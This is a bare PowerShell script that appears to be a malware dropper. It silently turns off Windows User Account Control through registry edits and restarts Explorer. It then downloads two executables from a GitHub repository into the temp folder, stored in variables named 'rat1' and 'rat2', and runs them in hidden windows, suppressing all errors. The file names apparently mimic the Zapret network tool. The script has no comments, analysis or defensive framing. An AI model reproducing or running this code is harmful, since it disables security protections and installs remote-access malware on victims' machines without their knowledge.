try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue
} catch { }
try {
    Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1
    Start-Process -FilePath "explorer.exe" -ErrorAction SilentlyContinue
} catch { }
$rat1 = "$env:TEMP\Zap.exe"
$rat2 = "$env:TEMP\ZAPRET.exe"
try {
    Invoke-WebRequest -Uri "https://github.com/sys1e/catl/raw/refs/heads/main/Zap.exe" -OutFile $rat1 -UseBasicParsing -ErrorAction SilentlyContinue
    Invoke-WebRequest -Uri "hhttps://github.com/sys1e/catl/raw/refs/heads/main/ZAPRET.exe" -OutFile $rat2 -UseBasicParsing -ErrorAction SilentlyContinue
} catch { }
try {
    Start-Process -FilePath $rat1 -WindowStyle Hidden -ErrorAction SilentlyContinue
    Start-Process -FilePath $rat2 -WindowStyle Hidden -ErrorAction SilentlyContinue
} catch { }

Exit
